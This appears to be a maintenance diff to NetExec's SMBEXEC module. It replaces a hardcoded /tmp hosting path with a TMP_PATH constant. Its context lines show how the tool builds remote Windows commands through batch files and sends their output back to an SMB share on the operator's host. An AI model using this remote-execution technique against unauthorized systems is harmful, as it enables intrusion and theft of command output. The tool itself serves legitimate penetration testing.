@@ -3,6 +3,7 @@ from os.path import join as path_join
 from time import sleep
 from impacket.dcerpc.v5 import transport, scmr
 from nxc.helpers.misc import gen_random_string
+from nxc.paths import TMP_PATH
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
 
 
@@ -95,7 +96,7 @@ class SMBEXEC:
 
         command = self.__shell + "echo " + data + f" ^> \\\\%COMPUTERNAME%\\{self.__share}\\{self.__output} 2^>^&1 > %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\\{self.__batchFile}" if self.__retOutput else self.__shell + data
 
-        with open(path_join("/tmp", "nxc_hosted", self.__batchFile), "w") as batch_file:
+        with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
             batch_file.write(command)
 
         self.logger.debug("Hosting batch file with command: " + command)
@@ -179,7 +180,7 @@ class SMBEXEC:
 
         command = self.__shell + data + f" ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}" if self.__retOutput else self.__shell + data
 
-        with open(path_join("/tmp", "nxc_hosted", self.__batchFile), "w") as batch_file:
+        with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
             batch_file.write(command)
 
         self.logger.debug("Hosting batch file with command: " + command)
@@ -214,7 +215,7 @@ class SMBEXEC:
 
         while True:
             try:
-                with open(path_join("/tmp", "nxc_hosted", self.__output), "rb") as output:
+                with open(path_join(TMP_PATH, self.__output), "rb") as output:
                     self.output_callback(output.read())
                 break
             except OSError:
